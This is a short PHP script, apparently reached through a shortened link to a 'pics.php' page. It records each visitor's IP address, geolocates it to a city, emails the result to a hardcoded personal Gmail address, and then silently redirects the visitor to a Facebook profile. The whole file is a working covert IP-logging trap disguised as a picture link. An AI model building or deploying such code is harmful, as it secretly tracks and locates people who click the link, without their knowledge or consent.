<?php
//http://api.mkgalaxy.com/pics.php
//http://goo.gl/z33KA9

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('naveenkhanchandani@gmail.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
header("Location: https://www.facebook.com/gurukk74");
exit;
?>